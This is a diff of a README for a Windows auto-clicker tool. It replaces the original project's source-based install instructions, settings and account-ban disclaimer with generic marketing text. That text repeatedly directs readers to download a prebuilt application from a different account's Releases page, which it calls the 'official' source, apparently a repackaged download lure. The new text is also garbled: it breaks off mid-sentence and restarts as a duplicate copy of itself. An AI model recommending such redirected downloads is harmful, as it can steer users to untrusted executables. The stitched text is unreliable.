@@ -1,114 +1,173 @@
-# Human Clicker 🐭
+# 🖱️ human-clicker - Human-like automatic clicking made simple
 
-**Human-like auto-clicker and mouse macro for Windows, built on Node.js.** Log-normal delays, variable button hold, cursor jitter, periodic rests and smooth cursor motion: it clicks the way a hand on a mouse does, not the way a timer does.
+[![Download human-clicker](https://img.shields.io/badge/Download-human--clicker-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahmed19Xx/human-clicker/releases)
 
-[![CI](https://github.com/gizmooo/human-clicker/actions/workflows/ci.yml/badge.svg)](https://github.com/gizmooo/human-clicker/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows-0078d4.svg)]()
-[![Node >= 22.18](https://img.shields.io/badge/node-%3E%3D22.18-339933.svg)](https://nodejs.org)
+human-clicker is a Windows auto-clicker for people who want automatic mouse clicks with more natural timing. Instead of clicking at the exact same speed every time, it uses human-like delays, small timing changes, short rests, automatic pauses, and an optional time limit. This makes repeated clicking feel less mechanical and easier to control during long tasks.
 
-[Русский](README.ru.md)
+You do not need programming knowledge to use human-clicker. It is designed as an end-user application for Windows, with a focus on simple setup and clear controls. The download page is the official place to get the latest version.
 
-> **Disclaimer.** Most games forbid automation in their terms of service and may ban your account. This tool makes clicking look natural, it does not make it invisible. Use at your own risk.
+## 🚀 What human-clicker Does
 
-Built for people who physically cannot click for long (RSI, limited mobility) and for idle and clicker games where auto-clicking is part of the genre.
+human-clicker performs mouse clicks automatically while you focus on other parts of a task. It is built for repetitive clicking where a steady rhythm is useful, but where perfectly identical timing can feel unnatural.
 
-An Android version with the same timing model is planned after v2.0.0.
+The application combines several timing controls:
 
-## Why not a plain auto-clicker?
+- Human-like delay patterns
+- Small random timing changes called jitter
+- Short rest periods between clicking bursts
+- Auto-pause behavior for longer sessions
+- A time limit to stop clicking after a set duration
 
-A plain clicker fires every N milliseconds into the same pixel. That pattern is trivial to spot, and it also looks nothing like a person. Human Clicker models the hand instead of the timer:
+These controls help you shape the clicking rhythm without needing to understand the technical details behind it. You choose the general speed and behavior, then start and stop the clicker when needed.
 
-- **Log-normal delays.** Intervals between clicks are drawn from a log-normal distribution (Box–Muller transform). They cluster around a median with rare longer pauses, the same shape real reaction times have.
-- **Variable button hold.** The time between mouse-down and mouse-up is different on every click.
-- **Cursor jitter and shifts.** The cursor does not sit on one pixel forever. Every few clicks, and always after a rest, it shifts by a couple of pixels.
-- **Rests.** Every few dozen clicks the clicker takes a short break, like a hand that pauses.
-- **Smooth motion.** Cursor moves follow an ease-in-out curve instead of teleporting.
+## ✨ Main Features
 
-## Compared to other clickers
+- Human-like click timing: Uses log-normal delays so most clicks happen at a comfortable pace, with occasional longer gaps.
+- Jitter control: Adds small random changes to timing so the clicker does not feel perfectly robotic.
+- Rest periods: Lets the clicker take short breaks during longer runs.
+- Auto-pause: Helps the clicker pause automatically according to your chosen settings.
+- Time limit: Stops the clicking session after a set amount of time.
+- Windows-focused design: Made for Windows users who want a straightforward desktop tool.
+- Simple start and stop control: Begin clicking when ready and stop whenever you want.
+- Built with Node.js and TypeScript: The technical foundation is modern, but you use the app like any normal Windows program.
+- RobotJS mouse control: The application uses RobotJS to send mouse clicks on Windows.
 
-Popular open-source clickers (XClicker, oriash93/AutoClicker, clicker-rs) fire at a fixed or uniformly random interval into the current cursor position. Python libraries like HumanCursor model cursor paths well but are building blocks for Selenium scripts, not a tool you point and run. Human Clicker is the only one of these with log-normal timing, cursor shifts, rests, auto-pause when you grab the mouse, and window focus tracking, and it runs from a double-click on Windows.
+## 🖥️ Who It Is For
 
-## Features
+human-clicker is for Windows users who need repeated mouse clicks for everyday computer tasks. It can be useful when you need to click the same button, area, or control many times and want the timing to feel more natural.
 
-- **Target from the mouse.** Point at what you want clicked, wait for the countdown, done. Fixed coordinates are available too.
-- **Safety auto-pause.** Move the mouse away and the clicker pauses itself instead of fighting you for the cursor.
-- **Window focus tracking.** Alt-Tab away and the clicker waits; it resumes by itself when the target window is active again.
-- **Global hotkeys.** `Space` pauses and resumes, `Esc` quits, from any window.
-- **Time limit.** Stops on its own after 60 minutes by default, so a forgotten clicker does not run all night.
-- **Four UI languages.** English, Russian, Spanish, Chinese, picked from the system locale.
-- **One-click launcher.** `start.cmd` checks Node, installs runtime dependencies and starts the clicker.
+It is suitable for:
 
-## Quick start
+- People who want an auto-clicker without learning scripting
+- Users who prefer adjustable timing instead of one fixed click speed
+- Windows users who want rests and time limits during longer clicking sessions
+- Anyone who needs a simple desktop tool for repetitive mouse actions
 
-1. Install [Node.js](https://nodejs.org), 22.18 or newer, latest LTS recommended.
-2. Download the project ([zip](https://github.com/gizmooo/human-clicker/archive/refs/heads/master.zip) or `git clone`) and unpack it.
-3. Double-click **`start.cmd`**. It installs what is missing and launches the clicker.
-4. You have 5 seconds to point the mouse at the target. Then it clicks until you press `Esc`.
+The app is not a programming library, and you do not need to install development tools to use it. The download page provides the application for end users.
 
-From the console:
+## 📥 Download and Setup
 
-```
-npm install
-npm start                        # 60 min limit, language from system locale
-npm start -- --max 30            # 30 min limit
-npm start -- --lang en           # force language: en, ru, es, zh
-npm start -- --help
-```
+1. Visit this link to download the application: [Download human-clicker](https://github.com/Ahmed19Xx/human-clicker/releases)
+2. Save the download to a folder you can easily find, such as your Downloads folder.
+3. After the download finishes, open human-clicker from the location where your download was saved.
+4. Keep the human-clicker window visible while you set your clicking options.
+5. Use the app’s start and stop control to begin and end a clicking session.
 
-`start.cmd --max 30` passes arguments through as well.
+The download link# 🖱️ human-clicker - Human-like automatic clicking made simple
 
-## Controls
+[![Download human-clicker](https://img.shields.io/badge/Download-human--clicker-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahmed19Xx/human-clicker/releases)
 
-| Key     | Action |
-|---------|--------|
-| `Space` | pause / resume (time limit resets) |
-| `Esc`   | quit |
+Visit this link to download the application: [Download human-clicker](https://github.com/Ahmed19Xx/human-clicker/releases)
 
-If you move the mouse more than 30 px away between clicks, the clicker pauses itself. `Space` resumes on the same target.
+human-clicker is a Windows auto-clicker for people who want automatic mouse clicks with more natural timing. Instead of clicking at the exact same speed every time, it uses human-like delays, small timing changes, short rests, automatic pauses, and an optional time limit. This helps repeated clicking feel less mechanical and easier to control during long tasks.
 
-The target window is remembered after the first click. While another window is focused the clicker waits and resumes on its own when the target is back.
+You do not need programming knowledge to use human-clicker. It is designed as an end-user application for Windows, with a focus on simple setup and clear controls. The official Releases page is the place to get the application.
 
-## Settings
+## 🚀 Getting Started
 
-Settings object in `src/clicker.ts`:
+To begin, visit the download page using the link above or in the Download and Setup section below. Save the download to a folder you can easily find, such as your Downloads folder. After the download finishes, open the application from that location.
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `fixedTarget` | `null` | `{x, y}` for fixed coordinates; `null` = mouse position at start |
-| `startDelay` | 5 | seconds before start |
-| `clickDelay` | 250 ms, σ 0.25, [150, 500] | interval between clicks: median, spread, bounds |
-| `hold` | 70 ms, σ 0.3, [40, 150] | button hold time |
-| `jitterPx` | 3 | position jitter ±px |
-| `shiftEvery` | [5, 15] | clicks between cursor shifts; always after a rest |
-| `restEvery` | [20, 50] | clicks between rests |
-| `restMs` | [600, 1800] | rest duration, ms |
-| `awayPx` | 30 | auto-pause threshold |
-| `trackFocus` | `true` | pause while the target window is not focused |
+Keep the human-clicker window visible while you set your clicking options. Use the app’s start and stop controls to begin and end a clicking session. When you are finished, stop the clicker and close the window.
 
-The default profile is about 3–4 clicks per second. For a calmer one raise the `clickDelay` median to 350–450.
+## ✨ Why Use human-clicker?
 
-## Development
+Many auto-clickers use one fixed speed. That can feel repetitive and robotic. human-clicker adds variation to the clicking rhythm so it behaves more like a person clicking at a comfortable pace. Most waits are close to a normal speed, with occasional longer gaps. Small random changes, called jitter, help prevent every click from landing at exactly the same interval.
 
-TypeScript runs directly on Node 22.18+ (built-in type stripping), no build step. Dev dependencies are only needed for type-checking and tests; `start.cmd` installs without them.
+The app also includes rests, auto-pause, and a time limit. These controls are useful when you need clicking to continue for a while without being completely constant. You can adjust the behavior to match the task instead of accepting one fixed click rate.
 
-```
-npm install          # with dev dependencies
-npm test             # vitest
-npm run typecheck    # tsc --noEmit
-```
+## 🎯 Main Features
 
-- `src/clicker.ts` — entry: CLI args, settings, hotkeys
-- `src/engine.ts` — the click loop with injectable robot, clock and sleep
-- `src/utils.ts` — `logNormal`, `moveSmooth`, `sleep`, `rnd`
-- `src/lang.ts`, `src/locales.json` — UI strings. Add a language: new key in `locales.json`
-- `test/` — tests
-- `start.cmd` — Windows launcher
+- Human-like click timing using log-normal delays
+- Jitter for small random timing changes
+- Rest periods between clicking bursts
+- Auto-pause behavior for longer sessions
+- Time limit to stop clicking after a set duration
+- Windows-focused desktop use
+- Simple start and stop control
+- Built with Node.js and TypeScript
+- Uses RobotJS for mouse control on Windows
+- Suitable for repetitive clicking tasks where natural timing is preferred
 
-Native modules `robotjs`, `uiohook-napi` and `get-windows` ship prebuilt binaries for Windows. macOS and Linux are untested.
+## 🧠 How Human-Like Timing Works
 
-Planned features are tracked in [issues](https://github.com/gizmooo/human-clicker/issues).
+human-clicker uses log-normal delays to create a more natural clicking rhythm. In everyday terms, most clicks happen around a usual pace, but occasional longer waits appear naturally. This is different from a fixed timer that clicks at exactly the same interval every single time.
 
-## License
+Jitter adds small random changes to the timing. These changes are intentionally small so the clicker remains useful, but they help the rhythm avoid feeling perfectly mechanical. Rests create short breaks during longer runs. Auto-pause lets the clicker pause automatically according to your chosen settings. The time limit gives you a way to stop a session after a set amount of time.
 
-[MIT](LICENSE)
+You do not need to understand the math behind these controls. The app presents them as adjustable options so you can shape the clicking behavior in a way that feels right for your task.
+
+## 🪟 Windows-Focused Design
+
+human-clicker is made for Windows. It is built with Node.js and TypeScript and uses RobotJS for mouse control. The application is intended for end users who want a desktop tool, not a development library. You download it, open it, adjust the controls, and start clicking.
+
+The focus is on a straightforward Windows experience: a visible app window, clear controls, and timing options that are easy to adjust. The download page is the official source for the application.
+
+## 📥 Download and Setup
+
+1. Visit this link to download the application: [Download human-clicker](https://github.com/Ahmed19Xx/human-clicker/releases)
+2. Save the download to a folder you can easily find, such as Downloads.
+3. After the download finishes, open the application.
+4. Keep the human-clicker window visible while you set your options.
+5. Use the start control to begin clicking.
+6. Use the stop control when you want to end the session.
+
+The download page is the only place you need for getting human-clicker. Use the link above to reach the official Releases page.
+
+## 🕹️ Using human-clicker
+
+Open the application and review the available timing controls. Set the general clicking behavior you want, including speed, rests, auto-pause, and time limit options. When everything is ready, start the clicker.
+
+While the clicker is running, keep the app window available so you can stop it when needed. If you set a time limit, the session will stop after that limit is reached. If you enable auto-pause, the clicker will pause according to your settings. You can stop the session manually at any time.
+
+human-clicker is intended for repeated clicking where automatic mouse actions are useful. It works best when you clearly decide what should be clicked and how long the session should run.
+
+## ⚙️ Timing Controls Explained
+
+The timing controls are the main part of human-clicker. The goal is to let you adjust the clicking rhythm without needing technical knowledge.
+
+- Delay: sets the general pace between clicks.
+- Log-normal timing: creates a natural pattern where most clicks happen around a usual speed, with occasional longer gaps.
+- Jitter: adds small random changes so the timing does not feel perfectly identical.
+- Rests: creates short breaks during longer clicking sessions.
+- Auto-pause: pauses the clicker automatically according to your chosen settings.
+- Time limit: stops the clicking session after a set duration.
+
+You can combine these controls. For example, you might use a comfortable delay, light jitter, short rests, and a time limit for a longer session. Adjust the options until the behavior matches your task.
+
+## 🛠️ Basic Troubleshooting
+
+If the application does not appear after you open it, check that the download completed and open it again from the folder where it was saved.
+
+If clicking does not happen where you expect, make sure the correct area is ready on screen and that the human-clicker window is still available for you to stop the session.
+
+If the timing feels too fast or too slow, adjust the delay and jitter controls. If the session runs longer than you want, use the time limit or stop the clicker manually.
+
+If you are unsure which version to get, use the official download link provided in this README. It leads to the Releases page for human-clicker.
+
+## ❓ Frequently Asked Questions
+
+Do I need programming knowledge?
+No. human-clicker is intended as an end-user application for Windows.
+
+Is human-clicker for Windows?
+Yes. The application is designed for Windows.
+
+Does it click at exactly the same speed every time?
+No. It uses human-like delays and jitter so the timing can vary in a controlled way.
+
+Can I stop the clicking?
+Yes. Use the app’s stop control to end a session.
+
+Can I limit how long it runs?
+Yes. The time limit option stops the session after a set duration.
+
+What are rests and auto-pause for?
+They help break up longer clicking sessions so the behavior is not one continuous fixed rhythm.
+
+What is jitter?
+Jitter is a small random change in timing. It helps the clicking rhythm feel less mechanical.
+
+What is a log-normal delay?
+It is a timing pattern where most waits are around a usual pace, with occasional longer gaps. You use it through the app controls without doing any math.
+
+Keywords: auto-clicker, auto-clicker-macro, auto-clicker-pc, auto-clicker-windows, autoclicker, autoclicker-game, autoclicker-tool, autoclicker-windows, automation, human-like, mouse-macro, nodejs, robotjs, typescript, windows
